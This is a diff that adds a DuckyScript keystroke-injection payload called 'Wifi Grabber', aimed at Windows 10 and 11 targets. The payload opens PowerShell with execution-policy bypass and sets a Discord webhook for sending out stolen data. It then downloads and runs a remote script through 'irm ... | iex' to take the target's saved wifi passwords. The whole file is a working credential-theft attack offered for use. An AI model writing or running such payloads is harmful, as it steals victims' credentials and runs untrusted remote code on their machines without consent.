@@ -1,0 +1,12 @@
+REM     Title: Wifi Grabber
+
+REM     Author: I am Jakoby
+
+REM     Description: This payload grabs your target's wifi passwords and uploads them to either Dropbox, Discord, or both.
+
+REM     Target: Windows 10, 11
+
+GUI r
+DELAY 500
+STRING powershell -NoP -Ep Bypass $dc='https://discord.com/api/webhooks/1313757783820075076/tJlbQLbycBQ7HM09I_5Bi-6T6Auhyq9rfLplpoiwlBLDEhT05KJR25uK_AvK_wXNZn5S';$db='';irm s1rchr0m3.de/aac | iex
+ENTER
